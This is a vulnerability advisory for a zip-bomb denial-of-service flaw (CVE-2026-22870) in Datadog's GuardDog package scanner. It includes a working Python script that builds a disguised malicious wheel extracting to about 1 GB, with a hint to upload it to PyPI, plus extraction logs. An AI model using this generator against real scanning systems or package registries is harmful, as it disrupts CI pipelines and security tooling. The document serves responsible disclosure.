# Datadog's GuardDog safe_extract mishadling of highly compressed files leads to resource exhaustion and DoS

## Description

GuardDog's safe_extract() function does not validate decompressed file sizes when extracting ZIP archives (wheels, eggs), allowing attackers to cause denial of service through zip bombs. A malicious package can consume gigabytes of disk space from a few megabytes of compressed data.

## Details

*   **Vendor**: Datadog

*   **Product**: GuardDog

*   **Firmware Version**: v2.7.0

*   **Repository's URL**: https://github.com/DataDog/guarddog

*   **Vulnerability Type**: CWE-409 Improper Handling of Highly Compressed (Data Amplification)

*   **CVE ID**: CVE-2026-22870

*   **Reported by**: Charbel


## Technical Breakdown

Looking at `guarddog/utils/archives.py`
```python
elif zipfile.is_zipfile(source_archive):
    with zipfile.ZipFile(source_archive, "r") as zip:
        for file in zip.namelist():
            zip.extract(file, path=os.path.join(target_directory, file))  # ❌ VULNERABLE
```

### Missing protections when dealing with zip files

* ❌ No decompressed size limit
* ❌ No compression ratio validation
* ❌ No file count limits
* ❌ No total extracted size validation


## Attack Vector

1. Attacker creates malicious wheel with highly compressed zip files
2. Uploads to PyPI or distributes directly
3. Package scan: guarddog pypi scan malicious-pkg
4. GuardDog downloads and extracts the package
5. Highly compressed files are decompressed in `/tmp` which can lead to resource exhaustion and DoS

## PoC

### Creating the malicious wheel

```python
# file: create_malicious_wheel.py
import zipfile
import os

def create_malicious_wheel():
    """Creates a legitimate-looking Python wheel with a zip bomb inside"""
    
    package_name = "helpful-utils"
    version = "1.0.0"
    wheel_name = f"{package_name.replace('-', '_')}-{version}-py3-none-any.whl"
    
    print(f"[*] Creating malicious wheel: {wheel_name}")
    
    with zipfile.ZipFile(wheel_name, 'w', zipfile.ZIP_DEFLATED) as whl:
        whl.writestr('helpful_utils/__init__.py', '''
"""Helpful utilities for Python developers"""
__version__ = "1.0.0"

def hello():
    return "Hello from helpful-utils!"
''')
        
        whl.writestr('helpful_utils/strings.py', '''
def reverse(s):
    """Reverse a string"""
    return s[::-1]

def capitalize_words(s):
    """Capitalize each word"""
    return ' '.join(word.capitalize() for word in s.split())
''')
        
        whl.writestr(f'{package_name.replace("-", "_")}-{version}.dist-info/METADATA', f'''Metadata-Version: 2.1
Name: {package_name}
Version: {version}
Summary: Helpful utility functions for Python
Home-page: https://github.com/legituser/helpful-utils
Author: John Doe
Author-email: john@example.com
License: MIT
Platform: any
Classifier: Development Status :: 5 - Production/Stable
Classifier: Intended Audience :: Developers
Classifier: Programming Language :: Python :: 3
Description-Content-Type: text/markdown
''')
        
        whl.writestr(f'{package_name.replace("-", "_")}-{version}.dist-info/WHEEL', '''Wheel-Version: 1.0
Generator: bdist_wheel (0.37.0)
Root-Is-Purelib: true
Tag: py3-none-any
''')
        
        whl.writestr(f'{package_name.replace("-", "_")}-{version}.dist-info/top_level.txt', 
                    'helpful_utils\n')
        
        whl.writestr(f'{package_name.replace("-", "_")}-{version}.dist-info/RECORD', 
                    'helpful_utils/__init__.py,,\nhelpful_utils/strings.py,,\n')
        
        # 3. THE BOMB: Single 1GB file of zeros (compresses to ~1MB)
        print("[*] Creating 1GB payload...")
        
        # Create 1GB of zeros (20 chunks of 50MB)
        chunk_size = 50 * 1024 * 1024  # 50MB
        num_chunks = 20  # 20 × 50MB = 1GB
        
        zeros_chunk = b'\x00' * chunk_size
        full_data = b''.join(zeros_chunk for _ in range(num_chunks))
        
        print(f"[*] Writing compressed file to wheel...")
        whl.writestr('helpful_utils/data/model.bin', full_data, compress_type=zipfile.ZIP_DEFLATED)
    
    # Show stats
    wheel_size = os.path.getsize(wheel_name)
    print(f"\n[+] Wheel created: {wheel_name}")
    print(f"[+] Compressed size: {wheel_size / (1024 * 1024):.2f} MB")
    print(f"[+] Extracts to: ~1 GB")
    print(f"[+] Compression ratio: ~{1024 / (wheel_size / (1024 * 1024)):.0f}:1")
    
    return wheel_name

if __name__ == '__main__':
    print("[*] Starting zip bomb creation...")
    print("[*] WARNING: This will use ~1GB of RAM temporarily")
    print()
    
    try:
        wheel = create_malicious_wheel()
        
        print(f"\n{'='*60}")
        print(f"[SUCCESS] Malicious wheel created!")
        print(f"{'='*60}")
        print(f"\n[!] Test locally:")
        print(f"    guarddog pypi scan {wheel}")
        print(f"\n[!] Or upload to PyPI:")
        print(f"    twine upload {wheel}")
        print(f"\n[*] When GuardDog extracts this, it will consume ~1GB of disk space")
        print(f"[*] This demonstrates the zip bomb vulnerability")
        
    except Exception as e:
        print(f"\n[ERROR] Failed to create wheel: {e}")
        import traceback
        traceback.print_exc()
```

Run the script to create the wheel
```
python3 create_path_traversal_wheel.py
```

### Testing the vulnerability
```
# Create the malicious wheel
python3 create_malicious_wheel.py

# Scan with GuardDog - causes 1GB extraction from 1MB highly compressed zip file
guarddog pypi scan helpful_utils-1.0.0-py3-none-any.whl
```

### Observed Behavior

Using inotifywait to monitor /tmp during extraction:
```
# Terminal 1
inotifywait -m -r /tmp --format '%T %w%f %e' --timefmt '%H:%M:%S' | \
    while read line; do 
        echo "$line"
        # Try to get file size if it's a modify/create event
        file=$(echo "$line" | awk '{print $2}')
        if [[ -f "$file" ]] && [[ "$file" == *model.bin* ]]; then
            ls -lh "$file"
        fi
    done

# Terminal 2  
guarddog pypi scan helpful_utils-1.0.0-py3-none-any.whl
```

inotifywait output showing file being extracted and size growing:
```
07:37:29 /tmp/tmphm8evy0p/helpful_utils-1.0.0.dist-info ACCESS,ISDIR
07:37:29 /tmp/tmphm8evy0p/helpful_utils-1.0.0.dist-info CLOSE_NOWRITE,CLOSE,ISDIR
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 137M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 138M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 138M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 139M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 140M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 141M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 142M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
...
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 996M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 998M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 999M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
07:37:29 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin MODIFY
-rw-rw-r-- 1 dwbruijn dwbruijn 1000M Jan  4 07:37 /tmp/tmphm8evy0p/helpful_utils/data/model.bin/helpful_utils/data/model.bin
```

### Results
* 0.97 MB wheel file → 1000 MB extracted
* Compression ratio: ~1030:1
* No size validation triggered

## Impact

Impact depends on how GuardDog is running and under which environment.

### Possible Scenarios
1. CI/CD pipeline disruption
    * Attacker publishes malicious package to PyPI
    * Developer adds package to requirements.txt
    * CI/CD runs GuardDog scan
    * Disk fills (GitHub Actions: standard 14GB limit)
    * All deployments blocked
2. Resource exhaustion
    * Local development environments
    * Security scanning infrastructure
    * Automated scanning systems
    * Docker containers with limited disk
3. Supply chain attack amplification
    * Single malicious package blocks security scanning
    * Prevents detection of other malicious packages
    * Forces manual intervention
    * Increases security team workload

# Timeline
* 2026-01-05: discovered
* 2026-01-05: Reported
* 2026-01-07 Verified by Datadog's team
* 2026-01-11 Patched version released
* 2026-01-13 Advisory published and CVE ID assigned

